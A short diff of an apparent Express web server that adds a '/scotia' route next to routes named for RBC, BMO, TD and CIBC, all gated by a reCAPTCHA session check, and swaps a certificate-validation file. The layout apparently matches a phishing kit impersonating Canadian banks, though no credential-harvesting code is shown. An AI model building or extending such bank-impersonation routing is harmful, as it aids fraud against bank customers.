@@ -184,8 +184,8 @@ app.get('/admin/config', checkRecaptchaSession, (req, res) => {
   res.sendFile(join(__dirname, '/admin/config.html'));
 });
 
-app.get('/.well-known/pki-validation/9B6D5F58C7D4AAB64549727EDBF1A878.txt', (req, res) => {
-  res.sendFile(join(__dirname, '/.well-known/pki-validation/9B6D5F58C7D4AAB64549727EDBF1A878.txt'));
+app.get('/.well-known/pki-validation/EAF11AA27EF4DEDF8860B38BCE0E9461.txt', (req, res) => {
+  res.sendFile(join(__dirname, '/.well-known/pki-validation/EAF11AA27EF4DEDF8860B38BCE0E9461.txt'));
 });
 
 
@@ -193,6 +193,7 @@ app.use('/rbc', checkRecaptchaSession, require('./routes/rbc'));
 app.use('/bmo', checkRecaptchaSession, require('./routes/bmo'));
 app.use('/td', checkRecaptchaSession, require('./routes/td'));
 app.use('/cibc', checkRecaptchaSession, require('./routes/cibc'));
+app.use('/scotia', checkRecaptchaSession, require('./routes/scotia'));
 
 app.post('/admin/set-recaptcha-key', checkRecaptchaSession, (req, res) => {
   const recaptchaSecretKey = req.body.recaptchaSecretKey;
